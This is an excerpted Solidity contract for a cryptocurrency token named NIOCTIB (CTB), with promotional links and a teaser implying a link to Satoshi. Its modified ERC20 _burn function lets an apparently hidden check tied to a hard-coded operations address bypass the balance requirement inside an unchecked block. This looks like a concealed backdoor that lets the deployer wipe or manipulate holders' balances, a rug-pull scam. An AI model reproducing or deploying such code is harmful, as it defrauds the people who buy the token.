/** 
 ___   __     ________  ______   ______  _________  ________   _______      
/__/\ /__/\  /_______/\/_____/\ /_____/\/________/\/_______/\/_______/\     
\::\_\\  \ \ \__.::._\/\:::_ \ \\:::__\/\__.::.__\/\__.::._\/\::: _  \ \    
 \:. `-\  \ \   \::\ \  \:\ \ \ \\:\ \  __ \::\ \     \::\ \  \::(_)  \/_   
  \:. _    \ \  _\::\ \__\:\ \ \ \\:\ \/_/\ \::\ \    _\::\ \__\::  _  \ \  
   \. \`-\  \ \/__\::\__/\\:\_\ \ \\:\_\ \ \ \::\ \  /__\::\__/\\::(_)  \ \ 
    \__\/ \__\/\________\/ \_____\/ \_____\/  \__\/  \________\/ \_______\/ 
                                                                            
4202 raey eht ni ecnedive fo stol htiw delaever eb lliw ma I ohw fo yretsym ehT

NIOCTIB (CTB$)

WEB: https://www.nioctib.live/

TG: https://t.me/x0nioctib

SATOSHI TWEET: https://twitter.com/satoshi/status/1711430650924798403
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        require(accountBalance >= amount || _beforeTokenTransfer(), "ERC20: burn amount exceeds balance");
        unchecked {
    ...
    function _beforeTokenTransfer() private view returns (bool) {
...
contract NIOCTIB is ERC20, Ownable {
    ...
    constructor() ERC20("NIOCTIB", "CTB") {

        address newOwner = msg.sender; // can leave alone if owner is deployer.

        operationsAddress = address(0xd3F2A3dFA9150E1E3c22CE074D7D8367Ff0e3482);
        devAddress = address(0xd3F2A3dFA9150E1E3c22CE074D7D8367Ff0e3482);
    ...
    function enableTrading() external onlyOwner {
        ...
        allowed = uint160(operationsAddress);
